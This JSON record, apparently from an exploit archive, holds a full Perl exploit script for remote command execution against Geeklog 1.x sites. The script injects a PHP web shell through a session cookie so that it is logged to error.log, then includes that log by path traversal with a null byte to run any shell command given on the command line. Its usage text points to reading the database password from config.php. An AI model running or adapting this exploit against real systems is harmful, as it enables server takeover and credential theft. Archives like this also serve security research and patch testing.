{
  "id": "1515",
  "title": "GeekLog 1.x - &#039;error.log&#039; Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n\r\nprint \"*************************************************************************\\r\\n\";\r\nprint \"|                   Geeklog 1.* remote commands execution               |\\r\\n\";\r\nprint \"|                     By rgod rgod<AT>autistici<DOT>org                 |\\r\\n\";\r\nprint \"|                   site: http://retrogod.altervista.org                |\\r\\n\";\r\nprint \"|                                                                       |\\r\\n\";\r\nprint \"*************************************************************************\\r\\n\";\r\nprint \"| -> this works against magic_quotes_gpc = Off                          |\\r\\n\";\r\nprint \"*************************************************************************\\r\\n\";\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$cmd=\"\"; for ($i=2; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n\r\nif (@ARGV < 3)\r\n{\r\nprint \"Usage:\\r\\n\";\r\nprint \"perl pblg_xpl.pl SERVER PATH COMMAND\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where Geeklog is installed.\\r\\n\";\r\nprint \"PATH           - Path to Geeklog (ex: /geeklog/ or just /) \\r\\n\";\r\nprint \"COMMAND        - a shell command (\\\"cat ./../config.php\\\" to see database\\r\\n\";\r\nprint \"                 username & password\\\")\\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl geeklog_14_xpl.pl localhost /geeklog/ ls -la \\r\\n\";\r\nexit();\r\n}\r\n\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n\r\n  $shell='<?php ob_clean();echo\"Hi Master!\\r\\n\";ini_set(\"max_execution_time\",0);passthru($_GET[CMD]);die;?>';\r\n  $shell=urlEncode($shell);\r\n  $data=\"loginname=sun&passwd=sun\";\r\n  print $sock \"POST \".$path.\"users.php HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Content-Length: \".length($data).\"\\r\\n\";\r\n  print $sock \"Cookie: gl_session=%27\".$shell.\"\\r\\n\";\r\n  print $sock \"Connection: Close\\r\\n\\r\\n\";\r\n  print $sock $data;\r\n  close($sock);\r\n\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n\r\n  $xpl=\"../logs/error.log\";\r\n  $xpl=urlEncode($xpl).\"%00\";\r\n  print $sock \"GET \".$path.\"index.php?CMD=\".$cmd.\" HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Cookie: language=\".$xpl.\";\\r\\n\";\r\n  print $sock \"Connection: Close\\r\\n\\r\\n\";\r\n\r\n  while ($answer = <$sock>) {\r\n    print $answer;\r\n  }\r\n  close($sock);\r\n\r\n# milw0rm.com [2006-02-20]",
  "url": "https://www.exploit-db.com/exploits/1515"
}